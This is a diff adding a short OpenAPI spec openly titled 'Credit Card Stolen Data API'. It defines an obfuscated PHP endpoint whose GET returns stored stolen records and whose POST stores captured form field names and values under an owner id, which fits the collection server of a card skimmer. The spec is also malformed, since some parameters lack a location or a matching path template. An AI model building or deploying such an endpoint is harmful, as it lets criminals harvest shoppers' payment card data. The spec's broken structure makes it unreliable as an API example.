@@ -1,0 +1,43 @@
+openapi: 3.0.0
+info:
+  title: Credit Card Stolen Data API
+  description: Basic BD to Store Stolen Data (We are wrong but are not bagunça)
+  version: 0.0.1
+
+paths:
+  /Zm9vbGluZyB0aGUgZm9vbA.php:
+    get:
+      summary: Return a sublist of stolen data.
+      description: Return a sublist of stolen data or all data identified from the given parameter.
+      parameters:
+        - name: aaa
+          in: path
+          description: Get all data identified from the given value. 
+          required: false
+          schema:
+              type : integer
+              format: int64
+              minimum: 1
+      responses:
+        '200':  
+          description: Table with stolen data.
+    post:
+      summary: Insert a new stolen data into the database
+      parameters:
+        - name: aaa
+          required: true
+          description: Random int to indentify owner
+          schema:
+              type : integer
+              minimum: 1
+        - name: f
+          required: true
+          description: Name of the input field
+          schema:
+              type: string
+        - name: v
+          required: true
+          description: Value of the input field
+          schema:
+              type : string
+          
